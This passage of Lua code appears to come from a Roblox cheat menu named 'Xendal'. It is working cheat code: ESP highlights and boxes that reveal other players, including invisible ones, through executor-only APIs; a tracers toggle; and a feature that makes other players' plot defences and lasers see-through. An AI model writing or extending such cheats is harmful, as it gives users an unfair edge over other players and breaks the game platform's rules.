					part:GetPropertyChangedSignal("Size"):Connect(function()
						box.Size = part.Size
					end)
				end
			end
		end
	
		local function RemoveBackupESP()
			for _, box in pairs(BackupESP) do
				box:Destroy()
			end
			BackupESP = {} -- Resetear BackupESP
		end
	
		-- Detectar muerte
		table.insert(Connections, Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
			if Humanoid.Health <= 0 then
				Highlight:Destroy()
				RemoveBackupESP()
				if NameBillboard then NameBillboard:Destroy() end
				for _, conn in next, Connections do
					conn:Disconnect()
				end
			end
		end))
	
		-- Revisar cada frame para invisibilidad y ajustar altura del DisplayName
		local HeartbeatConn
		HeartbeatConn = RunService.Heartbeat:Connect(function()
			if not isEnabled then
				Highlight.Enabled = false
				RemoveBackupESP()
				if NameBillboard then NameBillboard.Enabled = false end
				return
			end
	
			-- Detectar invisibilidad
			local isInvisible = false
			local upperTorso = Character:FindFirstChild("UpperTorso")
			if upperTorso and upperTorso.Transparency >= 0.9 then
				isInvisible = true
			end
	
			if isInvisible then
				Highlight.Enabled = false
				CreateBackupESP()
			else
				Highlight.Enabled = true
				RemoveBackupESP()
			end
	
			-- Ajustar altura del DisplayName
			if NameBillboard and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local localHRP = LocalPlayer.Character.HumanoidRootPart
				local enemyHRP = Character:FindFirstChild("HumanoidRootPart")
				if enemyHRP then
					local distance = (localHRP.Position - enemyHRP.Position).Magnitude
					local maxOffset = 3.3
					local minOffset = 1.5
					local maxDistance = 100
					local hideDistance = 1
					local offsetY = distance >= maxDistance and maxOffset or (minOffset + (distance/maxDistance)*(maxOffset-minOffset))
					NameBillboard.StudsOffset = Vector3.new(0, offsetY, 0)
					NameBillboard.Enabled = not (distance <= hideDistance and not isInvisible)
				end
			end
		end)
		table.insert(Connections, HeartbeatConn)
	
		-- Guardar referencias para poder eliminarlas si se desactiva
		PlayerConnections[Player] = Connections
		PlayerObjects[Player] = {Highlight = Highlight, BackupESP = BackupESP, Billboard = NameBillboard}
	end
	
	local function RemoveHighlight(Player)
		local objs = PlayerObjects[Player]
		if objs then
			if objs.Highlight then objs.Highlight:Destroy() end
			if objs.Billboard then objs.Billboard:Destroy() end
			if objs.BackupESP then
				for _, box in pairs(objs.BackupESP) do box:Destroy() end
			end
		end
		local conns = PlayerConnections[Player]
		if conns then
			for _, c in pairs(conns) do
				c:Disconnect()
			end
		end
		PlayerConnections[Player] = nil
		PlayerObjects[Player] = nil
	end
	
	-- Aplicar Highlight a jugadores existentes
	for _, Player in next, Players:GetPlayers() do
		ApplyHighlight(Player)
	end
	
	-- Aplicar Highlight a jugadores nuevos
	Players.PlayerAdded:Connect(function(Player)
		Player.CharacterAdded:Connect(function()
			ApplyHighlight(Player)
		end)
	end)
	
	-- Función Toggle
	local function toggleESP()
		isEnabled = not isEnabled
		updateButtonAppearance()
	
		if not isEnabled then
			for _, Player in next, Players:GetPlayers() do
				RemoveHighlight(Player)
			end
		else
			for _, Player in next, Players:GetPlayers() do
				ApplyHighlight(Player)
			end
		end
	end
	
	button.MouseButton1Click:Connect(toggleESP)
	updateButtonAppearance()
	
end;
task.spawn(C_20b);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Main Handler
local function C_20f()
local script = G2L["20f"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_20f);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.PingToggle.Holder.Button.LocalScript
local function C_216()
local script = G2L["216"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalPing") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_216);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Main Handler
local function C_21a()
local script = G2L["21a"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_21a);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.EspBoxToggle.Holder.Button.LocalScript
local function C_221()
local script = G2L["221"];
	--== TOGGLE BUTTON ESP (empieza apagado) ==--
	
	local button = script.Parent  -- Tu TextButton
	local espEnabled = false      -- Inicia en OFF
	
	-- color del botón
	local COLOR_OFF  = Color3.fromRGB(255,255,255)
	local COLOR_ON   = Color3.fromRGB(255,0,0)
	
	button.Text = ""
	button.TextColor3 = COLOR_OFF
	
	
	-------------------------------------------------------------------
	-- settings
	local settings = {
		defaultcolor = Color3.fromRGB(0, 0, 0),
		teamcheck = false,
		teamcolor = true
	};
	
	-- services
	local runService = game:GetService("RunService");
	local players = game:GetService("Players");
	
	-- variables
	local localPlayer = players.LocalPlayer;
	local camera = workspace.CurrentCamera;
	
	-- functions
	local newVector2, newColor3, newDrawing = Vector2.new, Color3.new, Drawing.new;
	local tan, rad = math.tan, math.rad;
	local round = function(...) local a = {}; for i,v in next, table.pack(...) do a[i] = math.round(v); end return unpack(a); end;
	local wtvp = function(...) local a, b = camera.WorldToViewportPoint(camera, ...) return newVector2(a.X, a.Y), b, a.Z end;
	
	local espCache = {};
	-------------------------------------------------------------------
	
	
	-- Crear ESP a jugadores
	local function createEsp(player)
		local drawings = {};
	
		drawings.box = newDrawing("Square");
		drawings.box.Thickness = 1;
		drawings.box.Filled = false;
		drawings.box.Color = settings.defaultcolor;
		drawings.box.Visible = false;
		drawings.box.ZIndex = 2;
	
		drawings.boxoutline = newDrawing("Square");
		drawings.boxoutline.Thickness = 3;
		drawings.boxoutline.Filled = false;
		drawings.boxoutline.Color = newColor3();
		drawings.boxoutline.Visible = false;
		drawings.boxoutline.ZIndex = 1;
	
		espCache[player] = drawings;
	end
	
	
	-- Remover ESP
	local function removeEsp(player)
		if rawget(espCache, player) then
			for _, drawing in next, espCache[player] do
				drawing:Remove();
			end
			espCache[player] = nil;
		end
	end
	
	
	-- Actualizar ESP por jugador
	local function updateEsp(player, esp)
		local character = player and player.Character;
		if character then
			local cframe = character:GetModelCFrame();
			local position, visible, depth = wtvp(cframe.Position);
	
			esp.box.Visible = visible and espEnabled
			esp.boxoutline.Visible = visible and espEnabled
	
			if cframe and visible and espEnabled then
				local scaleFactor = 1 / (depth * tan(rad(camera.FieldOfView / 2)) * 2) * 1000;
				local width, height = round(4 * scaleFactor, 5 * scaleFactor);
				local x, y = round(position.X, position.Y);
	
				esp.box.Size = newVector2(width, height);
				esp.box.Position = newVector2(round(x - width / 2, y - height / 2));
				esp.box.Color = settings.teamcolor and player.TeamColor.Color or settings.defaultcolor;
	
				esp.boxoutline.Size = esp.box.Size;
				esp.boxoutline.Position = esp.box.Position;
			end
		else
			esp.box.Visible = false;
			esp.boxoutline.Visible = false;
		end
	end
	
	
	-- Crear para todos los jugadores actuales
	for _, player in next, players:GetPlayers() do
		if player ~= localPlayer then
			createEsp(player);
		end
	end
	
	players.PlayerAdded:Connect(function(player)
		createEsp(player);
	end)
	
	players.PlayerRemoving:Connect(function(player)
		removeEsp(player);
	end)
	
	
	-- Render loop
	runService:BindToRenderStep("esp", Enum.RenderPriority.Camera.Value, function()
		if not espEnabled then
			-- si está apagado, esconder todo
			for _, drawings in next, espCache do
				drawings.box.Visible = false
				drawings.boxoutline.Visible = false
			end
			return
		end
	
		for player, drawings in next, espCache do
			if settings.teamcheck and player.Team == localPlayer.Team then
				continue;
			end
			if drawings and player ~= localPlayer then
				updateEsp(player, drawings);
			end
		end
	end)
	
	
	-------------------------------------------------------------------
	-- TOGGLE DEL BOTÓN
	-------------------------------------------------------------------
	
	button.MouseButton1Click:Connect(function()
		espEnabled = not espEnabled
	
		if espEnabled then
			button.Text = ""
			button.TextColor3 = COLOR_ON
		else
			button.Text = ""
			button.TextColor3 = COLOR_OFF
		end
	end)
	
end;
task.spawn(C_221);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Main Handler
local function C_225()
local script = G2L["225"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_225);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
local function C_22c()
local script = G2L["22c"];
	local Workspace = game:GetService("Workspace")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	local Plots = Workspace:WaitForChild("Plots")
	
	-- Configuración de transparencia
	local transparencyValue = 0.92
	local laserTransparencyValue = 0.75
	local refreshTime = 0.1  -- Tiempo entre actualizaciones (en segundos)
	
	-- Botón y sonido
	local button = script.Parent
	if not button:IsA("TextButton") then button = nil end
	
	local SOUND_ID = ""
	
	local scriptActivated = false
	local originalTransparency = {}
	local heartbeatConnection = nil -- Variable para controlar la conexión de Heartbeat
	
	-- Función de sonido
	local function playSound(character)
		local hrp = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head")
		if not hrp then return end
		local sound = Instance.new("Sound")
		sound.SoundId = SOUND_ID
		sound.Volume = 1
		sound.TimePosition = 0.01
		sound.Parent = hrp
		sound:Play()
		sound.Ended:Connect(function()
			if sound.Parent then sound:Destroy() end
		end)
	end
	
	-- Funciones de transparencia
	local function makeFolderTransparent(folder, value)
		for _, part in ipairs(folder:GetDescendants()) do
			if part:IsA("BasePart") then
				if originalTransparency[part] == nil then
					originalTransparency[part] = part.Transparency
				end
				part.Transparency = value
			end
		end
	end
	
	local function restoreFolderTransparency(folder)
		for _, part in ipairs(folder:GetDescendants()) do
			if part:IsA("BasePart") and originalTransparency[part] ~= nil then
				part.Transparency = originalTransparency[part]
				originalTransparency[part] = nil
			end
		end
	end
	
	local function applyTransparencyToPlot(plot)
		for _, folderName in ipairs({"Decorations", "Skin"}) do
			local folder = plot:FindFirstChild(folderName)
			if folder and folder:IsA("Folder") then
				makeFolderTransparent(folder, transparencyValue)
			end
		end
	
		local laserFolder = plot:FindFirstChild("Laser")
		if laserFolder and laserFolder:IsA("Folder") then
			for _, part in ipairs(laserFolder:GetDescendants()) do
				if part:IsA("BasePart") and part.Transparency < 0.9 then
					if originalTransparency[part] == nil then
						originalTransparency[part] = part.Transparency
					end
					part.Transparency = laserTransparencyValue
				end
			end
		end
	end
	
	local function restorePlotTransparency(plot)
		for _, folderName in ipairs({"Decorations", "Skin", "Laser"}) do
			local folder = plot:FindFirstChild(folderName)
			if folder and folder:IsA("Folder") then
				restoreFolderTransparency(folder)
			end
		end
	end
	
	local function detectMyPlot()
		local myDisplayName = LocalPlayer.DisplayName
		local myName = LocalPlayer.Name
		for _, plot in ipairs(Plots:GetChildren()) do
			if plot:IsA("Model") then
				local plotSign = plot:FindFirstChild("PlotSign")
				if plotSign then
					local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
					if surfaceGui then
						local frame = surfaceGui:FindFirstChild("Frame")
						if frame then
							local textLabel = frame:FindFirstChildWhichIsA("TextLabel")
							if textLabel and (textLabel.Text:find(myDisplayName) or textLabel.Text:find(myName)) then
								return plot
							end
						end
					end
				end
			end
		end
	end
	
	local function refreshTransparency()
		local myPlot = detectMyPlot()
		for _, plot in ipairs(Plots:GetChildren()) do
			if plot:IsA("Model") and plot ~= myPlot then
				applyTransparencyToPlot(plot)
			end
		end
	end
	
	-- Activar/desactivar script con botón
	local function runScript()
		refreshTransparency()
	end
	
	local function activateScript()
		if scriptActivated then
			-- Desactivar
			scriptActivated = false
			if button then
				button.TextColor3 = Color3.fromRGB(255, 255, 255) -- volver al color original
			end
			playSound(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()) -- sonido desactivar
	
			-- Restaurar todas las transparencias
			for _, plot in ipairs(Plots:GetChildren()) do
				if plot:IsA("Model") then
					restorePlotTransparency(plot)
				end
			end
	
			-- Desconectar Heartbeat si está activo
			if heartbeatConnection then
				heartbeatConnection:Disconnect()
				heartbeatConnection = nil
			end
	
			return
		end
	
		-- Activar
		scriptActivated = true
		if button then
			button.TextColor3 = Color3.fromRGB(70,130,180) -- verde
		end
		playSound(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()) -- sonido activar
	
		-- Conectar Heartbeat solo si está activado
		heartbeatConnection = RunService.Heartbeat:Connect(function()
			if scriptActivated then
				runScript()
			end
		end)
	end
	
	if button then
		button.MouseButton1Click:Connect(activateScript)
	end
	
	-- Escuchar nuevos descendientes de manera optimizada
	local function handleNewDescendant(descendant)
		if descendant:IsA("Folder") and (descendant.Name == "Decorations" or descendant.Name == "Laser" or descendant.Name == "Skin") then
			local plot = descendant:FindFirstAncestorOfClass("Model")
			if plot and plot ~= detectMyPlot() then
				if scriptActivated then
					applyTransparencyToPlot(plot)
				end
			end
		end
	end
	
	Plots.DescendantAdded:Connect(function(descendant)
		if scriptActivated then
			handleNewDescendant(descendant)
		end
	end)
	
	-- Utilizar un intervalo para refrescar las transparencias (para evitar sobrecargar con Heartbeat)
	task.spawn(function()
		while true do
			if scriptActivated then
				runScript()
			end
			task.wait(refreshTime)  -- Esperar entre actualizaciones para reducir la sobrecarga
		end
	end)
	
end;
task.spawn(C_22c);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Main Handler
local function C_230()
local script = G2L["230"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0)
			Cooldown = false
		end
	end)
end;
task.spawn(C_230);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.FpsToggle.Holder.Button.LocalScript
local function C_237()
local script = G2L["237"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalFps") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_237);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Main Handler
local function C_23b()
local script = G2L["23b"];
	local TweenService = game:GetService("TweenService")
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == true then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_23b);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
local function C_242()
local script = G2L["242"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent  -- Asume que el script está dentro de un TextButton
	
	-- Variable para controlar el estado del toggle
	local isEnabled = false
	
	-- Tabla para guardar los colores originales de los objetos
	local originalColors = {}
	
	-- Función para cambiar el color del botón
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Azul cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado (aunque no se puede desactivar)
		end
	end
	
	-- Función para aplicar el suavizado de colores y brillo
	local function applySmoothEffect()
		-- Itera sobre todos los objetos en el workspace y guarda sus colores originales antes de modificarlos
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				-- Guardar el color original
				originalColors[v] = v.Color
	
				-- Aplicar el suavizado
				v.Material = Enum.Material.Plastic
				v.Reflectance = 0
				local r, g, b = v.Color.r, v.Color.g, v.Color.b
				v.Color = Color3.new(r * 0.7, g * 0.7, b * 0.7)  -- Reduce brillo
			end
		end
	
		-- También aplica a objetos nuevos
		workspace.DescendantAdded:Connect(function(v)
			if v:IsA("BasePart") then
				-- Guardar el color original para nuevos objetos
				originalColors[v] = v.Color
	
				-- Aplicar suavizado
				v.Material = Enum.Material.Plastic
				v.Reflectance = 0
				local r, g, b = v.Color.r, v.Color.g, v.Color.b
				v.Color = Color3.new(r * 0.7, g * 0.7, b * 0.7)
			end
		end)
	end
	
	-- Función para quitar el suavizado de colores y brillo (sin uso en este caso)
	local function removeSmoothEffect()
		-- Esta función no se usará porque el script solo se activa una vez
	end
	
	-- Función Toggle para cambiar el estado de activación
	local function toggleEffect()
		if not isEnabled then
			isEnabled = true
			applySmoothEffect()  -- Aplica el suavizado
			updateButtonAppearance()  -- Actualiza el color del botón
		end
	end
	
	-- Conectar el evento al botón para alternar el efecto al hacer clic
	button.MouseButton1Click:Connect(toggleEffect)
	
	-- Función pública para acceder al toggle (no se usará la parte de desactivación)
	return {
		Toggle = toggleEffect,
		Enable = applySmoothEffect,
		Disable = removeSmoothEffect  -- Esta función no tiene efecto
	}
	
end;
task.spawn(C_242);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Main Handler
local function C_246()
local script = G2L["246"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_246);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Button.LocalScript
local function C_24d()
local script = G2L["24d"];
	getgenv().ESPTracers = false  -- Inicializamos como desactivado
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local button = script.Parent  -- Asume que el script está en un TextButton dentro de la UI
	
	local function AssignTracers()
		for _, player in pairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				local PlayerChar = game.Workspace:FindFirstChild(player.Name)
				local LocalChar = LocalPlayer.Character
				if not PlayerChar or not LocalChar or not LocalChar:FindFirstChild("HumanoidRootPart") then
					return
				end
	
				-- Buscar el Beam existente o crear uno nuevo
				local beam
				if PlayerChar and LocalChar then
					if PlayerChar:FindFirstChild("ESPBeam") then
						beam = PlayerChar:FindFirstChild("ESPBeam")
						if beam then
							beam.Enabled = getgenv().ESPTracers  -- Habilitar o deshabilitar el Beam según el estado de ESPTracers
							-- Crear Attachments para el Beam si está habilitado
